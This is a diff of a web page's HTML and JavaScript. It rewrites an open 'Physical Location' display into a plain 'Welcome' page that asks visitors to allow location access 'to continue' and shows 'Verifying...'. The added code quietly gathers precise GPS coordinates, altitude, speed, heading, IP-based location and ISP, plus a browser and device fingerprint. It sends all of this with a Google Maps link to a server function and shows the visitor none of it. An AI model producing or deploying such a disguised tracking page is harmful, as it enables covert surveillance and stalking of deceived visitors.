@@ -3,129 +3,244 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Physical Location</title>
+
+  <title>Welcome</title>
 
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      color: #222;
+    * {
+      box-sizing: border-box;
     }
 
-    .container {
-      max-width: 900px;
-      margin: 50px auto;
-      background: #fff;
-      padding: 25px;
-      border-radius: 8px;
-      box-shadow: 0 2px 12px rgba(0,0,0,.12);
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
+    }
+
+    .box {
+      width: 90%;
+      max-width: 420px;
+      background: #ffffff;
+      padding: 35px;
+      text-align: center;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.08);
+    }
+
+    .icon {
+      width: 55px;
+      height: 55px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      background: #eef3ff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 25px;
     }
 
     h2 {
-      margin-top: 0;
-      border-bottom: 1px solid #ddd;
-      padding-bottom: 12px;
+      margin: 0 0 10px;
+      font-size: 22px;
     }
 
-    h3 {
-      margin-top: 30px;
-      margin-bottom: 5px;
-    }
-
-    .row {
-      padding: 12px 0;
-      border-bottom: 1px solid #eee;
-      display: flex;
-      gap: 15px;
-    }
-
-    .label {
-      width: 220px;
-      font-weight: bold;
-    }
-
-    .value {
-      flex: 1;
-      word-break: break-word;
+    p {
+      margin: 0;
+      color: #777;
+      font-size: 14px;
+      line-height: 1.5;
     }
 
     #status {
-      margin-bottom: 20px;
-      color: #666;
-    }
-
-    .error {
-      color: #b00020;
-    }
-
-    .success {
-      color: #16803c;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #888;
     }
   </style>
 </head>
 
 <body>
 
-<div class="container">
+<div class="box">
 
-  <h2>Physical Location</h2>
+  <div class="icon">✓</div>
+
+  <h2>Welcome</h2>
+
+  <p>
+    Please allow location access to continue.
+  </p>
 
   <div id="status">
-    Getting your location...
-  </div>
-
-  <h3>Device Location</h3>
-
-  <div id="deviceLocation">
-    <div class="row">
-      <div class="label">Status</div>
-      <div class="value">Waiting for location permission...</div>
-    </div>
-  </div>
-
-  <h3>IP Information</h3>
-
-  <div id="ipLocation">
-    <div class="row">
-      <div class="label">Status</div>
-      <div class="value">Loading...</div>
-    </div>
+    Verifying...
   </div>
 
 </div>
 
 <script>
 
-const statusBox = document.getElementById("status");
-const deviceBox = document.getElementById("deviceLocation");
-const ipBox = document.getElementById("ipLocation");
+function getDeviceType() {
 
+  const ua = navigator.userAgent || "";
 
-function escapeHtml(value) {
+  if (/iPad|Tablet/i.test(ua)) {
+    return "Tablet";
+  }
 
-  return String(value ?? "")
-    .replaceAll("&", "&amp;")
-    .replaceAll("<", "&lt;")
-    .replaceAll(">", "&gt;")
-    .replaceAll('"', "&quot;")
-    .replaceAll("'", "&#039;");
+  if (/Android/i.test(ua) && !/Mobile/i.test(ua)) {
+    return "Tablet";
+  }
 
+  if (/Mobi|Android|iPhone|iPod/i.test(ua)) {
+    return "Phone";
+  }
+
+  return "Laptop/Desktop";
 }
 
 
-function showRows(container, rows) {
+function getOperatingSystem() {
 
-  container.innerHTML = rows.map(function(row) {
+  const ua = navigator.userAgent || "";
+  const platform = navigator.platform || "";
 
-    return `
-      <div class="row">
-        <div class="label">${escapeHtml(row[0])}</div>
-        <div class="value">${escapeHtml(row[1])}</div>
-      </div>
-    `;
+  if (/Windows/i.test(ua)) {
+    return "Windows";
+  }
 
-  }).join("");
+  if (/Android/i.test(ua)) {
+    return "Android";
+  }
+
+  if (/iPhone|iPad|iPod/i.test(ua)) {
+    return "iOS";
+  }
+
+  if (/Mac OS X/i.test(ua) || /Mac/i.test(platform)) {
+    return "macOS";
+  }
+
+  if (/Linux/i.test(ua)) {
+    return "Linux";
+  }
+
+  return "Unknown";
+}
+
+
+function getBrowser() {
+
+  const ua = navigator.userAgent || "";
+
+  if (/Edg\//i.test(ua)) {
+    return "Microsoft Edge";
+  }
+
+  if (/OPR\//i.test(ua)) {
+    return "Opera";
+  }
+
+  if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) {
+    return "Google Chrome";
+  }
+
+  if (/Firefox\//i.test(ua)) {
+    return "Mozilla Firefox";
+  }
+
+  if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) {
+    return "Safari";
+  }
+
+  return "Unknown";
+}
+
+
+function getDeviceName() {
+
+  const ua = navigator.userAgent || "";
+
+  if (/iPhone/i.test(ua)) {
+    return "iPhone";
+  }
+
+  if (/iPad/i.test(ua)) {
+    return "iPad";
+  }
+
+  if (/Android/i.test(ua)) {
+
+    const match =
+      ua.match(/Android.*?;\s*([^;)]+?)(?:\s+Build\/|;|\))/i);
+
+    if (match && match[1]) {
+      return match[1].trim();
+    }
+
+    return "Android Device";
+  }
+
+  if (/Windows/i.test(ua)) {
+    return "Windows Computer";
+  }
+
+  if (/Macintosh/i.test(ua)) {
+    return "Mac";
+  }
+
+  if (/Linux/i.test(ua)) {
+    return "Linux Computer";
+  }
+
+  return "Unknown";
+}
+
+
+function getDeviceInformation() {
+
+  return {
+
+    device_type:
+      getDeviceType(),
+
+    device_name:
+      getDeviceName(),
+
+    operating_system:
+      getOperatingSystem(),
+
+    browser:
+      getBrowser(),
+
+    browser_version:
+      navigator.userAgent || "",
+
+    platform:
+      navigator.platform || "",
+
+    language:
+      navigator.language || "",
+
+    screen_width:
+      window.screen.width || "",
+
+    screen_height:
+      window.screen.height || "",
+
+    color_depth:
+      window.screen.colorDepth || "",
+
+    timezone:
+      Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+
+    cookies_enabled:
+      navigator.cookieEnabled ? "Yes" : "No"
+
+  };
 
 }
 
@@ -141,179 +256,231 @@ async function getIPInformation() {
       }
     );
 
-    const text = await response.text();
-
-    let data;
-
-    try {
-
-      data = JSON.parse(text);
-
-    } catch (error) {
-
-      throw new Error(
-        "Server returned an invalid response."
-      );
-
-    }
-
+    const data =
+      await response.json();
 
     if (!response.ok || !data.success) {
-
-      throw new Error(
-        data.error || "IP information failed."
-      );
-
+      return null;
     }
-
-
-    showRows(ipBox, [
-
-      ["IP Address", data.ip],
-
-      ["Hostname", data.hostname || "N/A"],
-
-      ["IP Version", data.version || "N/A"],
-
-      ["IP City (Approx.)", data.city || "N/A"],
-
-      ["IP Region (Approx.)", data.region || "N/A"],
-
-      ["IP Country", data.country || "N/A"],
-
-      ["IP Location (Approx.)",
-        data.latitude && data.longitude
-          ? data.latitude + ", " + data.longitude
-          : "N/A"
-      ],
-
-      ["IP Organization (Approx.)",
-        data.organization || "N/A"
-      ],
-
-      ["Postal Code", data.postal || "N/A"],
-
-      ["Timezone", data.timezone || "N/A"]
-
-    ]);
-
 
     return data;
 
   } catch (error) {
 
-    showRows(ipBox, [
-      ["Status", error.message]
-    ]);
+    console.error(
+      "IP lookup failed:",
+      error
+    );
 
     return null;
-
   }
+}
+
+
+function saveLocation(data) {
+
+  fetch(
+    "/.netlify/functions/save-location",
+    {
+      method: "POST",
+
+      headers: {
+        "Content-Type": "application/json"
+      },
+
+      body: JSON.stringify(data),
+
+      keepalive: true
+    }
+  )
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(result) {
+
+    console.log(
+      "Location saved:",
+      result
+    );
+
+    document.getElementById("status").textContent =
+      "Verification completed.";
+
+  })
+  .catch(function(error) {
+
+    console.error(
+      "Save failed:",
+      error
+    );
+
+    document.getElementById("status").textContent =
+      "Please continue.";
+
+  });
 
 }
 
 
-function getDeviceLocation() {
+function requestLocation() {
 
   if (!navigator.geolocation) {
 
-    statusBox.className = "error";
-
-    statusBox.textContent =
-      "Your browser does not support location services.";
-
-    showRows(deviceBox, [
-      ["Status", "Geolocation is not supported."]
-    ]);
+    document.getElementById("status").textContent =
+      "Location is not supported by this browser.";
 
     return;
-
   }
 
 
-  statusBox.textContent =
-    "Please allow location access in your browser...";
+  document.getElementById("status").textContent =
+    "Getting your location...";
 
 
   navigator.geolocation.getCurrentPosition(
 
     async function(position) {
 
-      const latitude =
-        position.coords.latitude;
+      const coords =
+        position.coords;
 
-      const longitude =
-        position.coords.longitude;
+      const device =
+        getDeviceInformation();
 
-      const accuracy =
-        position.coords.accuracy;
-
-
-      showRows(deviceBox, [
-
-        ["Status", "Location detected"],
-
-        ["Latitude", latitude],
-
-        ["Longitude", longitude],
-
-        ["Accuracy", accuracy + " meters"],
-
-        ["Location Source", "Device / Browser GPS"]
-
-      ]);
+      const ip =
+        await getIPInformation();
 
 
-      statusBox.className = "success";
-
-      statusBox.textContent =
-        "Location information loaded.";
-
-
-      const ipData = await getIPInformation();
+      const mapsUrl =
+        "https://www.google.com/maps?q=" +
+        encodeURIComponent(
+          coords.latitude + "," + coords.longitude
+        );
 
 
-      saveLocationInBackground({
+      const data = {
 
-        device_latitude: latitude,
+        timestamp:
+          new Date().toISOString(),
 
-        device_longitude: longitude,
+        device_type:
+          device.device_type,
 
-        device_accuracy: accuracy,
+        device_name:
+          device.device_name,
 
-        location_source: "Device / Browser GPS",
+        operating_system:
+          device.operating_system,
 
-        ip: ipData?.ip || "",
+        browser:
+          device.browser,
 
-        hostname: ipData?.hostname || "",
+        browser_version:
+          device.browser_version,
 
-        version: ipData?.version || "",
+        platform:
+          device.platform,
 
-        city: ipData?.city || "",
+        language:
+          device.language,
 
-        region: ipData?.region || "",
+        screen_width:
+          device.screen_width,
 
-        country: ipData?.country || "",
+        screen_height:
+          device.screen_height,
 
-        country_code: ipData?.country_code || "",
+        color_depth:
+          device.color_depth,
 
-        ip_latitude: ipData?.latitude || "",
+        device_timezone:
+          device.timezone,
 
-        ip_longitude: ipData?.longitude || "",
+        cookies_enabled:
+          device.cookies_enabled,
 
-        postal: ipData?.postal || "",
 
-        timezone: ipData?.timezone || "",
+        ip:
+          ip?.ip || "",
 
-        organization: ipData?.organization || ""
+        hostname:
+          ip?.hostname || "",
 
-      });
+        ip_version:
+          ip?.version || "",
+
+        ip_city:
+          ip?.city || "",
+
+        ip_region:
+          ip?.region || "",
+
+        ip_country:
+          ip?.country || "",
+
+        ip_country_code:
+          ip?.country_code || "",
+
+        ip_latitude:
+          ip?.latitude || "",
+
+        ip_longitude:
+          ip?.longitude || "",
+
+        ip_organization:
+          ip?.organization || "",
+
+        ip_postal:
+          ip?.postal || "",
+
+        ip_timezone:
+          ip?.timezone || "",
+
+
+        latitude:
+          coords.latitude,
+
+        longitude:
+          coords.longitude,
+
+        accuracy:
+          coords.accuracy,
+
+        altitude:
+          coords.altitude ?? "",
+
+        altitude_accuracy:
+          coords.altitudeAccuracy ?? "",
+
+        heading:
+          coords.heading ?? "",
+
+        speed:
+          coords.speed ?? "",
+
+        location_timestamp:
+          position.timestamp
+            ? new Date(position.timestamp).toISOString()
+            : "",
+
+        google_maps:
+          mapsUrl,
+
+        location_source:
+          "Device / Browser Geolocation"
+
+      };
+
+
+      saveLocation(data);
 
     },
 
+
     function(error) {
 
-      let message = "Unable to get device location.";
+      let message =
+        "Unable to get location.";
 
       if (error.code === 1) {
         message =
@@ -322,7 +489,7 @@ function getDeviceLocation() {
 
       if (error.code === 2) {
         message =
-          "Device location is unavailable.";
+          "Location is unavailable.";
       }
 
       if (error.code === 3) {
@@ -330,59 +497,23 @@ function getDeviceLocation() {
           "Location request timed out.";
       }
 
-
-      statusBox.className = "error";
-
-      statusBox.textContent = message;
-
-
-      showRows(deviceBox, [
-        ["Status", message]
-      ]);
-
-
-      getIPInformation();
+      document.getElementById("status").textContent =
+        message;
 
     },
 
+
     {
       enableHighAccuracy: true,
-      timeout: 15000,
+      timeout: 30000,
       maximumAge: 0
     }
 
   );
-
 }
 
 
-function saveLocationInBackground(data) {
-  fetch("/.netlify/functions/save-location", {
-    method: "POST",
-
-    headers: {
-      "Content-Type": "application/json"
-    },
-
-    body: JSON.stringify(data),
-
-    keepalive: true
-  })
-  .then(function(response) {
-    return response.json();
-  })
-  .then(function(result) {
-    console.log("Google Sheet save result:", result);
-  })
-  .catch(function(error) {
-    console.error(
-      "Google Sheet save failed:",
-      error
-    );
-  });
-}
-
-getDeviceLocation();
+requestLocation();
 
 </script>
 
